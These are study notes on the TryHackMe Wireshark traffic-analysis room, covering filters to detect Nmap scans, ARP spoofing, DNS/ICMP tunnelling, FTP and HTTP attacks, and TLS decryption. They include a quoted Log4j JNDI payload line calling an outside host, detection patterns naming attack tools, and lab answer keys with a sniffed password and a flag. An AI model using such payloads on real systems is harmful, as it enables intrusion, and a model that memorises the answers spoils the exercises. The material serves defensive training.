
#Subscribers 

https://tryhackme.com/room/wiresharktrafficanalysis

### NEED TO DO THE EXERCISES !
   

In this room, we will cover the techniques and key points of traffic analysis with Wireshark and detect suspicious activities. Note that this is the third and last room of the Wireshark room trio, and it is suggested to visit the first two rooms stated below to practice and refresh your Wireshark skills before starting this one

In the first two rooms, we have covered how to use Wireshark and do packet-level searches. Now, it is time to investigate and correlate the packet-level information to see the big picture in the network traffic, like detecting anomalies and malicious activities. For a security analyst, it is vital to stop and understand pieces of information spread in packets by applying the analyst's knowledge and tool functionality. This room will cover investigating packet-level details by synthesizing the analyst knowledge and  Wireshark functionality for detecting anomalies and odd situations for a given case.

## nmap scans

Nmap is an industry-standard tool for mapping networks, identifying live hosts and discovering the services. As it is one of the most used network scanner tools, a security analyst should identify the network patterns created with it. This section will cover identifying the most common Nmap scan types.

- TCP connect scans
- SYN scans
- UDP scans

It is essential to know how Nmap scans work to spot scan activity on the network. However, it is impossible to understand the scan details without using the correct filters. Below are the base filters to probe Nmap scan behaviour on the network.

### TCP flags

```
# global search
tcp
udp

# only SYN flag
tcp.flags ==2
tcp.flags.syn ==1

# only ACK 
tcp.flags == 16
tcp.flags.ack == 1

# only SYN, ACK 
tcp.flags == 18
(tcp.flags.syn ==1) and (tcp.flags.ack ==1)

# only RST
tcp.flags == 20
(tcp.flags.reset ==1) and (tcp.flags.ack ==1)

# only FIN 
tcp.flags == 1
tcp.flags.fin == 1

```

TCP Connect Scans  

**TCP Connect Scan in a nutshell:**
- Relies on the three-way handshake (needs to finish the handshake process).
- Usually conducted with `nmap -sT` command.
- Used by non-privileged users (only option for a non-root user).
- Usually has a windows size larger than 1024 bytes as the request expects some data due to the nature of the protocol.

```
# open TCP port
SYN -->
<-- SYN , ACK
ACK -->

# open TCP port
SYN -->
<-- SYN , ACK
ACK -->
RST, ACK -->

# closed TCP port
SYN -->
<-- RST, ACK

```

open TCP port (connect)
```
source          destination         info 
10.10.60.7      10.10.47.123        [RST,ACK] Seq=1 ...
```
closed TCP port (connect)
```
source          destination         info 
10.10.47.123    10.10.60.7          21 -> 59934 [RST,ACK] ...
```

filter the TCP connect
```
tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024
```

### SYN scans

TCP SYN Scan in a nutshell:
- Doesn't rely on the three-way handshake (no need to finish the handshake process).
- Usually conducted with `nmap -sS` command.
- Used by privileged users.
- Usually have a size less than or equal to 1024 bytes as the request is not finished and it doesn't expect to receive data.

```
# open TCP port
SYN -->
<-- SYN, ACK
RST -->

# close TCP port
SYN -->
<-- RST, ACK
```

open TCP port (SYN)
```
source          destination         info 
10.10.60.7      10.10.47.123        36044 -> 22 [RST] ...
```
closed TCP port (SYN)
```
source          destination         info 
10.10.47.123    10.10.60.7          21 -> 36044 [RST, ACK] ...
```

filter TCP SYN captures
```
tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024
```

### UDP scans

UDP Scan in a nutshell:
- Doesn't require a handshake process
- No prompt for open ports
- ICMP error message for close ports
- Usually conducted with `nmap -sU` command.

```
# open UDP port
UDP packet -->

# closed UDP port
UDP packet -->

Closed (port no 69) and open (port no 68) UDP ports

source          destination       protocol   info
10.10.60.7      10.10.47.123      UDP        45350 -> 69
10.10.47.123    10.10.60.7        ICMP       destination unreachable
10.10.60.7      10.10.47.123      UDP        35357 -> 68

# filter UDP scan
icmp.type==3 and icmp.code==3

```

```
Use the "Desktop/exercise-pcaps/nmap/Exercise.pcapng" file.
What is the total number of the "TCP Connect" scans?

tcp.flags.syn ==1 and tcp.flags.ack==0 and tcp.window_size >1024
1000

Which scan type is used to scan the TCP port 80?

tcp connect

How many "UDP close port" messages are there?

tcp.port ==80 || udp.port==80
1083

filter the destination port (UDP) with the "filter a column" option. Finally, scroll the bar in the packet list section and investigate the findings manually.
Which UDP port in the 55-70 port range is open?

udp.port >= 55 && udp.port <= 70
68

```

## ARP poisoning & MITM

**ARP** protocol, or Address Resolution Protocol (**ARP**), is the technology responsible for allowing devices to identify themselves on a network. Address Resolution Protocol Poisoning (also known as ARP Spoofing or Man In The Middle (MITM) attack) is a type of attack that involves network jamming/manipulating by sending malicious ARP packets to the default gateway. The ultimate aim is to manipulate the **"IP to MAC address table"** and sniff the traffic of the target host.

There are a variety of tools available to conduct ARP attacks. However, the mindset of the attack is static, so it is easy to detect such an attack by knowing the ARP protocol workflow and Wireshark skills.    

**ARP analysis in a nutshell:**

- Works on the local network
- Enables the communication between MAC addresses
- Not a secure protocol
- Not a routable protocol
- It doesn't have an authentication function
- Common patterns are request & response, announcement and gratuitous packets.

Before investigating the traffic, let's review some legitimate and suspicious ARP packets. The legitimate requests are similar to the shown picture: a broadcast request that asks if any of the available hosts use an IP address and a reply from the host that uses the particular IP address.

```
# global search
arp

- Opcode 1: ARP requests.
- Opcode 2: ARP responses.
- Hunt: Arp scanning
- Hunt: Possible ARP poisoning detection
- Hunt: Possible ARP flooding from detection:

arp.opcode == 1
arp.opcode == 2
arp,dst.hw_mac == 00:00:00:00:00:00
arp.duplicate-address-detected 
arp.duplicate-address-frame
((arp) && (arp.opcode == 1)) && (arp.src.hw_mac == target-mac-address)
```

checking for malicious activity
```
# ARP request

source             destination    info
00:0c:29:e2:18:b4  ff:ff:ff..     Who has 192.168.1.1? Tell 192.168.1.25

# ARP reply
source             destination    info
50:78:b3:f3:cd:f4  00:0c:29...    192.168.1.1 is at 50:78:b3:f3:cd:f4

----- ! 
A suspicious situation means having two different ARP responses (conflict) for a particular IP address. Possible spoofing 

Duplicate IP address detected for 192.168.1.1 
-----

1 IP address from a MAC address
- MAC: 00:0c:29:e2:18:b4
- IP: 192.168.1.25

Possible ARP spoofing 2 MAC addresses claim same IP 192.168.1.1
- MAC1: 50:78:b3:f3:cd:f4
- MAC 2: 00:0c:29:e2:18:b4

Possible ARP flooding  MAC address with 'b4' claims new IP
- MAC: 00:0c:29:e2:18:b4
- IP: 192.168.1.1

#----- inspect more logs, A security analyst cannot ignore a flood of ARP requests. 

1 IP claims new MAC address
- MAC: 00:0c:29:e2:18:b4
- IP: 192.168.1.25

possible ARP spoofing 2 MAC addresses claim 192.168.1.1
- MAC1: 50:78:b3:f3:cd:f4
- MAC 2: 00:0c:29:e2:18:b4

possible ARP spoofing MAC address with 'b4' claims new IP
- MAC: 00:0c:29:e2:18:b4
- IP: 192.168.1.1

possible ARP flooding MAC with 'b4' uses multiple ARP requests with various IP ranges
- MAC: 00:0c:29:e2:18:b4
- IP: 192.168.1.xxx

The MAC address that ends with "b4" is the destination of all HTTP packets! It is evident that there is a MITM attack

the attacker is the host with the MAC address that ends with "b4". All traffic linked to "192.168.1.12" IP addresses is forwarded to the malicious host. 

===========
3 IP to MAC address matches
- MAC: 00:0c:29:e2:18:b4 = IP: 192.168.1.25
- MAC: 50:78:b3:f3:cd:f4 = IP: 192.1681.1
- MAC: 00:0c:29:98:c7:a8 = IP: 192.168.1.12

The attacker created noise with ARP packets.
- MAC: 00:0c:29:e2:18:b4 = IP: 192.168.1.25

router/gateway address
- MAC: 50:78:b3:f3:cd:f4 = IP: 192.1681.1

victim, attacker sniffed all traffic of the victim
- MAC: 50:78:b3:f3:cd:f4 = IP: 192.1681.12

```

Detecting these bits and pieces of information in a big capture file is challenging. However, in real-life cases, you will not have "tailored data" ready for investigation. Therefore you need to have the analyst mindset, knowledge and tool skills to filter and detect the anomalies. 

>[!info] **Note:** 
>In traffic analysis, there are always alternative solutions available. The solution type and the approach depend on the analyst's knowledge and skill level and the available data sources.

```
Use the "Desktop/exercise-pcaps/arp/Exercise.pcapng" file.  
(Only requests made by the attacker are relevant to this question!)
What is the number of ARP requests crafted by the attacker? 

284

What is the number of HTTP packets received by the attacker?

90

(Filter the site visited by the victim, then filter the post requests. Focusing on URI sections of the packet details after filtering could help.)
What is the number of sniffed username&password entries?
6

(Special characters are displayed in HEX format. Make sure that you convert them to ASCII.)
What is the password of the "Client986"? 

clientnothere!

What is the comment provided by the "Client354"?

nice work!
```

## ID hosts: DHCP, NetBIOS, Kerberos

When investigating a compromise or malware infection activity, a security analyst should know how to identify the hosts on the network apart from IP to MAC address match. One of the best methods is identifying the hosts and users on the network to decide the investigation's starting point and list the hosts and users associated with the malicious traffic/activity.

Usually, enterprise networks use a predefined pattern to name users and hosts. While this makes knowing and following the inventory easier, it has good and bad sides. The good side is that it will be easy to identify a user or host by looking at the name. The bad side is that it will be easy to clone that pattern and live in the enterprise network for adversaries. There are multiple solutions to avoid these kinds of activities, but for a security analyst, it is still essential to have host and user identification skills.  

Protocols that can be used in Host and User identification:

- Dynamic Host Configuration Protocol (DHCP) traffic
- NetBIOS (NBNS) traffic 
- Kerberos traffic

### DHCP Analysis

**DHCP** protocol, or Dynamic Host Configuration Protocol **(DHCP)****, is the technology responsible for managing automatic IP address and required communication parameters assignment.  

**DHCP investigation in a nutshell:**
```
# global search 
dhcp 
bootp

--------------------------
Filtering the proper DHCP packet options is vital to finding an event of interest.   

"DHCP Request" packets contain the hostname information
"DHCP ACK" packets represent the accepted requests
"DHCP NAK" packets represent denied requests

Due to the nature of the protocol, only "Option 53" ( request type) has predefined static values. You should filter the packet type first, and then you can filter the rest of the options by "applying as column" or use the advanced filters like "contains" and "matches".

Request  dhcp.option.dhcp == 3
    ACK  dhcp.option.dhcp == 5
    NAK  dhcp.option.dhcp == 6
--------------------------

--------------------------
"DHCP Request" options for grabbing the low-hanging fruits:

Option 12: Hostname.
Option 50: Requested IP address.
Option 51: Requested IP lease time.
Option 61: Client's MAC address.

dhcp.option.hostname contains "keyword"
--------------------------

--------------------------
"DHCP ACK" options for grabbing the low-hanging fruits:

Option 15: Domain name.
Option 51: Assigned IP lease time.

dhcp.option.domain_name contains "keyword"
--------------------------

--------------------------
"DHCP NAK" options for grabbing the low-hanging fruits:

Option 56: Message (rejection details/reason).

As the message could be unique according to the case/situation, It is suggested to read the message instead of filtering it. Thus, the analyst could create a more reliable hypothesis/result by understanding the event circumstances.
--------------------------

Frame
Ethernet II
Internet Protocol version
User Datagram Protocol
Dynamic Host Configuration Protocol (Inform)
	Bootp flags
	Option (53) DHCP Message Type
	Option (61) Client identifier
	Option (12) Host Name
		Length: 12
		Host Name: librarian-pc
	
```

### NetBIOS (NBNS) analysis

**NetBIOS** or **Net**work Basic Input/ Output System is the technology responsible for allowing applications on different hosts to communicate with each other. 

**NBNS investigation in a nutshell:**

```
# global search
nbns

"NBNS" options for grabbing the low-hanging fruits:

- Queries: Query details.
- Query details could contain "name, Time to live (TTL) and IP address details"

nbns.name contains "keyword"

------------------------------------------
source        destination        info
192.168.0.22  192.168.0.25       name query NB CONV_XEROX<00>

Frame
Ethernet
Internet Protocol
User Datagram
NetBIOS Name Service
	Transaction ID
	Flags:
	Questions: 1
	Answer RRS
	Authority RRS
	Additional RRS
	Queries
		CONV XEROX<00>
			Name: CONV_XEROX<00>
			Type: NB
			Class: IN
```

### kerberos analysis

**Kerberos** is the default authentication service for Microsoft Windows domains. It is responsible for authenticating service requests between two or more computers over the untrusted network. The ultimate aim is to prove identity securely.  

**Kerberos investigation in a nutshell:**

```
# global search
kerberos

# User account search:
CNameString: <username>

Note:
Some packets could provide hostname information in this field. To avoid this confusion, filter the "$" value. The values end with "$" are hostnames, and the ones without it are user names.

kerberos.CNameString contains "keyword"
kerberos.CNameString and !(kerberos.CNameString contains "$" )

"Kerberos" options for grabbing the low-hanging fruits:

pvno:  Protocol version.
realm: Domain name for the generated ticket.  
sname: Service and domain name for the generated ticket.
addresses: Client IP address and NetBIOS name.  

Note: 
the "addresses" information is only available in request packets.

kerberos.pvno == 5
kerberos.realm contains ".org"
kerberos.SNameString == "krbtg"

-----------------------------
source     destination    protocol    info
10.1.12.2  10.5.3.1       KRB5        TGS-REQ
10.5.2.1   10.1.12.1      KRB5        TGS-REP

Frame
Ethernet
Internet Protocol
User Datagram Protocol
Kerberos
	tgs-rep
		pvno: 5
		msg-type: krb-tgs-rep (13)
		crealm: DENYDC.COM
		cname
			name-type: kRB5-NT-PRINCIPAL 
			cname-string: 1 item
				cnameString: u1
		ticket
		enc-part

```

```
Use the "Desktop/exercise-pcaps/dhcp-netbios-kerberos/dhcp-netbios.pcap" file.  
(Filtering a pattern rather than actual value can help.)
What is the MAC address of the host "Galaxy A30"?

9a:81:41:cb:96:6c

("nbns.flags.opcode == 5" filter can help.)
How many NetBIOS registration requests does the "LIVALJM" workstation have?

16

Which host requested the IP address "172.16.13.85"?

galaxy-a12

Use the 
"Desktop/exercise-pcaps/dhcp-netbios-kerberos/**kerberos.pcap" file. 
What is the IP address of the user "u5"? (Enter the address in defanged format.)

10[.]1[.]12[.]2

What is the hostname of the available host in the Kerberos packets?

xp1$

```

## tunneling traffic: DNS and ICMP

Traffic tunnelling is (also known as **"port forwarding"**) transferring the data/resources in a secure method to network segments and zones. It can be used for "internet to private networks" and "private networks to internet" flow/direction. There is an encapsulation process to hide the data, so the transferred data appear natural for the case, but it contains private data packets and transfers them to the final destination securely.  

Tunnelling provides anonymity and traffic security. Therefore it is highly used by enterprise networks. However, as it gives a significant level of data encryption, attackers use tunnelling to bypass security perimeters using the standard and trusted protocols used in everyday traffic like ICMP and DNS. Therefore, for a security analyst, it is crucial to have the ability to spot ICMP and DNS anomalies.

### ICMP Analysis   

Internet Control Message Protocol (ICMP) is designed for diagnosing and reporting network communication issues. It is highly used in error reporting and testing. As it is a trusted network layer protocol, sometimes it is used for denial of service (DoS) attacks; also, adversaries use it in data exfiltration and C2 tunnelling activities.

ICMP analysis in a nutshell:

Usually, ICMP tunnelling attacks are anomalies appearing/starting after a malware execution or vulnerability exploitation. As the ICMP packets can transfer an additional data payload, adversaries use this section to exfiltrate data and establish a C2 connection. It could be a TCP, HTTP or SSH data. As the ICMP protocols provide a great opportunity to carry extra data, it also has disadvantages. Most enterprise networks block custom packets or require administrator privileges to create custom ICMP packets.

A large volume of ICMP traffic or anomalous packet sizes are indicators of ICMP tunnelling. Still, the adversaries could create custom packets that match the regular ICMP packet size (64 bytes), so it is still cumbersome to detect these tunnelling activities. However, a security analyst should know the normal and the abnormal to spot the possible anomaly and escalate it for further analysis.

```
# global search
icmp

"ICMP" options for grabbing the low-hanging fruits:

Packet length.
ICMP destination addresses.  
Encapsulated protocol signs in ICMP payload.

data.len > 64 and icmp

------------------------
source           destination      protocol   length   info
192.168.154.131  192.168.154.132  ICMP       1028     Echo (ping)
192.168.154.132  192.168.154.131  ICMP       1028     Echo (ping)
```

### DNS analysis 

Domain Name System (DNS) is designed to translate/convert IP domain addresses to IP addresses. It is also known as a phonebook of the internet. As it is the essential part of web services, it is commonly used and trusted, and therefore often ignored. Due to that, adversaries use it in data exfiltration and C2 activities.

**DNS analysis in a nutshell:  
  
Similar to ICMP tunnels, DNS attacks are anomalies appearing/starting after a malware execution or vulnerability exploitation. Adversary creates (or already has) a domain address and configures it as a C2 channel. The malware or the commands executed after exploitation sends DNS queries to the C2 server. However, these queries are longer than default DNS queries and crafted for subdomain addresses. Unfortunately, these subdomain addresses are not actual addresses; they are encoded commands as shown below:  
- `"encoded-commands.maliciousdomain.com" `

When this query is routed to the C2 server, the server sends the actual malicious commands to the host. As the DNS queries are a natural part of the networking activity, these packets have the chance of not being detected by network perimeters. A security analyst should know how to investigate the DNS packet lengths and target addresses to spot these anomalies.

```
# global search
dns

"DNS" options for grabbing the low-hanging fruits:

- Query length.
- Anomalous and non-regular names in DNS addresses.
- Long DNS addresses with encoded subdomain addresses.
- Known patterns like dnscat and dns2tcp.
- Statistical analysis like the anomalous volume of DNS requests for a particular target.

!mdns: Disable local link device queries.
dns.qry.name.len > 15 and !mdns

dns contains "dnscat"

--------------------------------
source           destination     protocol  info
192.168.253.1   192.168.253.128  DNS       query 0x536v MX dnscat.3b8..
192.168.253.128 192.168.253.1    DNS       response 0x536 MX dnscat

```

```
Use the "Desktop/exercise-pcaps/dns-icmp/icmp-tunnel.pcap" file.  
1) Remember, Wireshark is not an IDS/IPS tool. A security analyst should know how to filter the packets and investigate the results manually. 
2) Filtering anomalous packets and investigating the packet details (including payload data) could help.

Investigate the anomalous packets. Which protocol is used in ICMP tunnelling?

ssh

After filtering the packets, focus on the payload data in the packet bytes section. You might need to use the tool in full-screen mode/full-screen the VM.

Use the "Desktop/exercise-pcaps/dns-icmp/dns.pcap" file.  
Investigate the anomalous packets. What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.)

dataexfil[.]com

```

- https://medium.com/@kumarishefu.4507/try-hack-me-wireshark-traffic-analysis-write-up-part-1-8fa705db0dae

## cleartext protocol analysis FTP

Investigating cleartext protocol traces sounds easy, but when the time comes to investigate a big network trace for incident analysis and response, the game changes. Proper analysis is more than following the stream and reading the cleartext data. For a security analyst, it is important to create statistics and key results from the investigation process. As mentioned earlier at the beginning of the Wireshark room series, the analyst should have the required network knowledge and tool skills to accomplish this. Let's simulate a cleartext protocol investigation with Wireshark!

### FTP Analysis   

File Transfer Protocol (FTP) is designed to transfer files with ease, so it focuses on simplicity rather than security. As a result of this, using this protocol in unsecured environments could create security issues like:

- MITM attacks
- Credential stealing and unauthorized access
- Phishing
- Malware planting
- Data exfiltration

```
# global search
ftp

"FTP" options for grabbing the low-hanging fruits:

x1x series: Information request responses.
x2x series: Connection messages.
x3x series: Authentication messages.

Note: "200" means command successful.
-------------------------

-------------------------
"x1x" series options for grabbing the low-hanging fruits:

211: System status.
212: Directory status.
213: File status

ftp.response.code == 211
------------------------

------------------------
"x2x" series options for grabbing the low-hanging fruits:

220: Service ready.
227: Entering passive mode.
228: Long passive mode.
229: Extended passive mode.

ftp.response.code == 230
------------------------

------------------------
"x3x" series options for grabbing the low-hanging fruits:

230: User login.
231: User logout.
331: Valid username.
430: Invalid username or password
530: No login, invalid password.

ftp.response.code == 230
------------------------

------------------------
"FTP" commands for grabbing the low-hanging fruits:

USER: Username.
PASS: Password.
CWD:  Current work directory.
LIST: List.

ftp.request.command == "USER"
ftp.request.command == "PASS"
ftp.request.arg == "password"
------------------------

------------------------
Advanced usages examples for grabbing low-hanging fruits:

Bruteforce signal:     List failed login attempts.
Bruteforce signal:     List target username.
Password spray signal: List targets for a static password.

ftp.response.code == 530

(ftp.response.code == 530) and (ftp.response.arg contains "username")

(ftp.request.command == "PASS" ) and (ftp.request.arg == "password")
------------------------

------------------------------------------------
source         destination    protocol  info
10.121.70.151  10.234.125.254 FTP       response: 530 Login incorrect
10.121.70.151  10.234.125.254 FTP       response: 331 password required
10.234.125.254 10.121.70.151  FTP       request: PASS merlin
10.121.70.151  10.234.125.254 FTP       response: Login incorrect
```

```
Use the "Desktop/exercise-pcaps/ftp/ftp.pcap" file.How many incorrect login attempts are there? (FTP code 530.)

737

What is the size of the file accessed by the "ftp" account?  (Filtering the response code "213" can help.)

39424

The adversary uploaded a document to the FTP server. What is the filename?

resume.doc

The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary?

chmod 777
```

## cleartext protocol analysis HTTP

Hypertext Transfer Protocol (HTTP) is a cleartext-based, request-response and client-server protocol. It is the standard type of network activity to request/serve web pages, and by default, it is not blocked by any network perimeter. As a result of being unencrypted and the backbone of web traffic, HTTP is one of the must-to-know protocols in traffic analysis. Following attacks could be detected with the help of HTTP analysis:
- Phishing pages
- Web attacks
- Data exfiltration
- Command and control traffic (C2)

HTTP analysis in a nutshell:

```
# global search
http
http2

-------------------------------
"HTTP Request Methods" for grabbing the low-hanging fruits:

GET
POST
Request: Listing all requests

http.request.method == "GET"
http.request.method == "POST"
http.request
-------------------------------

-------------------------------
"HTTP Response Status Codes" for grabbing the low-hanging fruits:

200 OK:                     Request successful.
301 Moved Permanently:      Resource is moved to a new URL/path 
302 Moved Temporarily:      Resource is moved to a new URL/path 
400 Bad Request:            Server didn't understand the request.
401 Unauthorised:           URL needs authorisation (login, etc.).
403 Forbidden:              No access to the requested URL. 
404 Not Found:              Server can't find the requested URL.
405 Method Not Allowed:     Used method is not suitable or blocked.
408 Request Timeout:        Request look longer than server wait time.
500 Internal Server Error:  Request not completed, unexpected error.
503 Service Unavailable:    Request not completed server/service down.

http.response.code == 200
http.response.code == 401
http.response.code == 403
http.response.code == 404
http.response.code == 405
http.response.code == 503
-------------------------------

-------------------------------
"HTTP Parameters" for grabbing the low-hanging fruits:

User agent:   Browser & OS identification to a web server application.
Request URI:  Points the requested resource from the server.
Full URI:     Complete URI information.
URI:          Uniform Resource Identifier.

http.user_agent contains "nmap"
http.request.uri contains "admin"
http.request.full_uri contains "admin"
-------------------------------

-------------------------------
"HTTP Parameters" for grabbing the low-hanging fruits:

Server:                Server service name.
Host:                  Hostname of the server
Connection:            Connection status.
Line-based text data:  Cleartext data provided by the server.
HTML Form URL Encoded: Web form information.

http.server contains "apache"
http.host contains "keyword"
http.host == "keyword"
http.connection == "Keep-Alive"
data-text-lines contains "keyword"
-------------------------------

```

### User Agent Analysis

As the adversaries use sophisticated technics to accomplish attacks, they try to leave traces similar to natural traffic through the known and trusted protocols. For a security analyst, it is important to spot the anomaly signs on the bits and pieces of the packets. The "user-agent" field is one of the great resources for spotting anomalies in HTTP traffic. In some cases, adversaries successfully modify the user-agent data, which could look super natural. A security analyst cannot rely only on the user-agent field to spot an anomaly. Never whitelist a user agent, even if it looks natural. User agent-based anomaly/threat detection/hunting is an additional data source to check and is useful when there is an obvious anomaly. If you are unsure about a value, you can conduct a web search to validate your findings with the default and normal user-agent info ([**example site**](https://developers.whatismybrowser.com/useragents/explore/)).

```
# global search
http.user_agent

Research outcomes for grabbing the low-hanging fruits:

- Different user agent information from same host in short time notice.
- Non-standard and custom user agent info.
- spelling differences. ("Mozilla" vs "Mozlilla" or "Mozlila")
- Audit tools: Nmap, Nikto, Wfuzz and sqlmap in the user agent field.
- Payload data in the user agent field.

(http.user_agent contains "sqlmap") 
(http.user_agent contains "Nmap") 
(http.user_agent contains "Wfuzz") 
(http.user_agent contains "Nikto")

http.user_agent
----------------------------
source         destination   protocol  info         User-Agent
192.168.3.131  209.17.73.39  HTTP      GET /dvwa/   wfuzz/2.4
```

### Log4j analysis 

A proper investigation starts with prior research on threats and anomalies going to be hunted. Let's review the knowns on the "Log4j" attack before launching Wireshark.  

Log4j vulnerability analysis in a nutshell:

```
Research outcomes for grabbing the low-hanging fruits:

The attack starts with a "POST" request
There are known cleartext patterns: "jndi:ldap" and "Exploit.class".

http.request.method == "POST"
(ip contains "jndi") 
(ip contains "Exploit")
(frame contains "jndi") 
(frame contains "Exploit")
(http.user_agent contains "$") 
(http.user_agent contains "==")

(ip contains "jndi") or (ip contains "Exploit")
---------------------------
source       destination     protocol info
45.137.21.9  198.71.247.91   HTTP     GET /$%7Bjndi:ldap://<IP>/Exploit

```

```
Use the "Desktop/exercise-pcaps/http/user-agent.cap" file.  

1) The answer is not the number of packets. It is the number of anomalous user-agent types. You need to filter the "user agent" info "as a column" and conduct a manual investigation of the packet details to spot the anomalies. 
2) In addition to the obvious "non-standard" and modified user agent types: Does "Windows NT 6.4" exist?

Investigate the user agents. What is the number of anomalous  "user-agent" types?

6

What is the packet number with a subtle spelling difference in the user agent field?

52

Use the "Desktop/exercise-pcaps/http/http.pcapng" file.  
Locate the "Log4j" attack starting phase. What is the packet number?

444

Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)

62[.]210[.]130[.]250

```

## encrypted protocol analysis: decrypt HTTPS

When investigating web traffic, analysts often run across encrypted traffic. This is caused by using the Hypertext Transfer Protocol Secure (HTTPS) protocol for enhanced security against spoofing, sniffing and intercepting attacks. HTTPS uses TLS protocol to encrypt communications, so it is impossible to decrypt the traffic and view the transferred data without having the encryption/decryption key pairs. As this protocol provides a good level of security for transmitting sensitive data, attackers and malicious websites also use HTTPS. Therefore, a security analyst should know how to use key files to decrypt encrypted traffic and investigate the traffic activity.

The packets will appear in different colours as the HTTP traffic is encrypted. Also, protocol and info details (actual URL address and data returned from the server) will not be fully visible. The first image below shows the HTTP packets encrypted with the TLS protocol. The second and third images demonstrate filtering HTTP packets without using a key log file.

Additional information for HTTPS :
```
"HTTPS Parameters" for grabbing the low-hanging fruits:

Request: Listing all requests

TLS: Global TLS search
TLS Client Request
TLS Server response
Local Simple Service Discovery Protocol (SSDP)

Note: 
SSDP is a network protocol that provides advertisement and discovery of network services.

http.request
tls
tls.handshake.type == 1
tls.handshake.type == 2
ssdp

-------------------------------------
source          destination      protocol   info
192.168.1.12    239.255.255.250  SSDP       M-SEARCH * HTTP/1.1
172.217.17.237  192.168.1.12     TCP        443 -> 64511 [SYN, ACK]
192.168.1.12    172.217.17.237   TLSv1.3    Client Hello
```

Similar to the TCP three-way handshake process, the TLS protocol has its handshake process. The first two steps contain "Client Hello" and "Server Hello" messages. The given filters show the initial hello packets in a capture file. These filters are helpful to spot which IP addresses are involved in the TLS handshake.

```
Client Hello: (http.request or tls.handshake.type == 1) and !(ssdp) 
Server Hello: (http.request or tls.handshake.type == 2) and !(ssdp)  

```

An encryption key log file is a text file that contains unique key pairs to decrypt the encrypted traffic session. These key pairs are automatically created (per session) when a connection is established with an SSL/TLS-enabled webpage. As these processes are all accomplished in the browser, you need to configure your system and use a suitable browser (Chrome and Firefox support this) to save these values as a key log file. 

To do this, you will need to set up an environment variable and create the `SSLKEYLOGFILE`, and the browser will dump the keys to this file as you browse the web. SSL/TLS key pairs are created per session at the connection time, so it is important to dump the keys during the traffic capture. Otherwise, it is not possible to create/generate a suitable key log file to decrypt captured traffic. You can use the "right-click" menu or **"Edit --> Preferences --> Protocols --> TLS"** menu to add/remove key log files.

>[!info] Note 
> the packet details and bytes pane provides the data in different formats for investigation. Decompressed header info and HTTP2 packet details are available after decrypting the traffic. Depending on the packet details, you can also have the following data formats:>
>: Frame
>: Decrypted TLS
>: Decompressed Header
>: Reassembled TCP
>: Reassembled SSL

```
Use the "Desktop/exercise-pcaps/https/Exercise.pcap" file.  

"Protocol Details Pane --> TLS --> Handshake Protocol --> Extension: server_name" can help.
What is the frame number of the "Client Hello" message sent to "accounts.google.com"?

16

Import the key file to decrypt the traffic.
Decrypt the traffic with the "KeysLogFile.txt" file. What is the number of HTTP2 packets?

115

Go to Frame 322. What is the authority header of the HTTP2 packet? (Enter the address in defanged format.)

safebrowsing[.]googleapis[.]com

You can export objects after decrypting the traffic.
Investigate the decrypted packets and find the flag! What is the flag?

flag{thm-packetmaster}
```

## bonus hunt cleartext credentials 

Up to here, we discussed how to inspect the packets for specific conditions and spot anomalies. As mentioned in the first room, Wireshark is not an IDS, but it provides suggestions for some cases under the expert info. However, sometimes anomalies replicate the legitimate traffic, so the detection becomes harder. For example, in a cleartext credential hunting case, it is not easy to spot the multiple credential inputs and decide if there is a brute-force attack or if it is a standard user who mistyped their credentials.

As everything is presented at the packet level, it is hard to spot the multiple username/password entries at first glance. The detection time will decrease when an analyst can view the credential entries as a list. Wireshark has such a feature to help analysts who want to hunt cleartext credential entries.

Some Wireshark dissectors (FTP, HTTP, IMAP, pop and SMTP) are programmed to extract cleartext passwords from the capture file. You can view detected credentials using the **"Tools --> Credentials"** menu. This feature works only after specific versions of Wireshark (v3.1 and later). Since the feature works only with particular protocols, it is suggested to have manual checks and not entirely rely on this feature to decide if there is a cleartext credential in the traffic.

Once you use the feature, it will open a new window and provide detected credentials. It will show the packet number, protocol, username and additional information. This window is clickable; clicking on the packet number will select the packet containing the password, and clicking on the username will select the packet containing the username info. The additional part prompts the packet number that contains the username.

```
Use the "Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap" file.  

"Tools --> Credentials" can help.
What is the packet number of the credentials using "HTTP Basic Auth"?

237

What is the packet number where "empty password" was submitted?

170

```

## bonus actionable results

You have investigated the traffic, detected anomalies and created notes for further investigation. What is next? Not every case investigation is carried out by a crowd team. As a security analyst, there will be some cases you need to spot the anomaly, identify the source and take action. Wireshark is not all about packet details; it can help you to create firewall rules ready to implement with a couple of clicks. You can create firewall rules by using the **"Tools --> Firewall ACL Rules"** menu. Once you use this feature, it will open a new window and provide a combination of rules (IP, port and MAC address-based) for different purposes. Note that these rules are generated for implementation on an outside firewall interface.  

Currently, Wireshark can create rules for:

- Netfilter (iptables)
- Cisco IOS (standard/extended)
- IP Filter (ipfilter)
- IPFirewall (ipfw)
- Packet filter (pf)
- Windows Firewall (netsh new/old format)

```
Use the "Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap" file.  

"Tools --> Firewall ACL Rules" can help.
Select packet number 99. Create a rule for "IPFirewall (ipfw)". What is the rule for "denying source IPv4 address"?

add deny ip from 10.121.70.151 to any in

"Deny" option can help.
Select packet number 231. Create "IPFirewall" rules. What is the rule for "allowing destination MAC address"?

add allow MAC 00:d0:59:aa:af:80 any in

```

https://medium.com/@kumarishefu.4507/try-hack-me-wireshark-traffic-analysis-write-up-part-2-11d299b504f3

## conclusion

Congratulations! You just finished the "Wireshark: The Traffic Analysis" room.

In this room, we covered how to use the Wireshark to detect anomalies and investigate events of interest at the packet level. Now, we invite you to complete the Wireshark challenge room: [**Carnage**](https://tryhackme.com/room/c2carnage), **[Warzone 1](https://tryhackme.com/r/room/warzoneone)** and **[Warzone 2](https://tryhackme.com/r/room/warzonetwo)**.

Wireshark is a good tool for starting a network security investigation. However, it is not enough to stop the threats. A security analyst should have IDS/IPS knowledge and extended tool skills to detect and prevent anomalies and threats. As the attacks are getting more sophisticated consistently, the use of multiple tools and detection strategies becomes a requirement. The following rooms will help you step forward in network traffic analysis and anomaly/threat detection.  

- [**NetworkMiner**](https://tryhackme.com/room/networkminer)
- [**Snort**](https://tryhackme.com/room/snort)
- [**Snort Challenge: The Basics**](https://tryhackme.com/room/snortchallenges1)
